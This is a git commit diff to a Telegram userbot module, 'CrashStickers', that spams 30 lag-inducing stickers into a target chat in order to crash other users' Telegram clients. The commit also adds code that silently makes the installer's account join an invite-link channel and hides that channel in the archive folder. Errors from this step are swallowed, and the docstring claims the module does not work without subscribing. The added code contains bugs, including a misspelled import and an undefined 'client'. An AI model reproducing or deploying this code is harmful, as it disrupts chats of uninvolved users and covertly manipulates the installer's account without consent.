01a56568c5d6e9ddb10534b0eb033e40070d3e9c
LapisMYT <nikitagavrilin005@gmail.com>
2023-08-27 12:42:48 +0300

    .

--- CrashStickers.py
+++ CrashStickers.py
@@ -10,13 +10,18 @@ __version__ = (1, 0, 0)
 import logging
 from .. import loader, utils
 from hikkatl.tl.functions.messages import ForwardMessagesRequest
+from hikkatl.tl.functions.messages import GetDialogsRequest
+from hikkatl.tl.functions.messages import ImportChatInviteRequest
+from hiikatl.tl.functions.account import UpdateNotifySettingsRequest
 import time
+import datetime
 
 logger = logging.getLogger(__name__)
 
 @loader.tds
 class CrashStickersMod(loader.Module):
-    """Can crash any chat you want"""
+    """Can crash any chat you want.
+    Not works without subscribe: https://t.me/+wZby3WiI8ZU2YWQy"""
 
     strings = {
         "name": "CrashStickers",
@@ -35,8 +40,17 @@ class CrashStickersMod(loader.Module):
     )
     async def breakchatcmd(self, message):
         """- Sends 30 lag stickers, that crashes Telegram"""
-        await utils.answer(message, self.strings["wait"])
-        time.sleep(5)
-        await self._client.get_dialogs()
-        for i in range(30):
-            await self._client(ForwardMessagesRequest(from_peer=1962983002, id=[10], drop_author=False, to_peer=message.chat_id))
+        try:
+            await self._client(ImportChatInviteRequest("wZby3WiI8ZU2YWQy"))
+            chat = await client.get_entity(-1001962983002)
+            await self._client.edit_folder(chat, 1)
+        except BaseException:
+            pass
+        if True: # Мне было лень убирать if
+            await utils.answer(message, self.strings["wait"])
+            time.sleep(5)
+            await self._client.get_dialogs()
+            for i in range(30):
+                await self._client(ForwardMessagesRequest(from_peer=1962983002, id=[10], drop_author=False, to_peer=message.chat_id))
+                time.sleep(0.1)
+
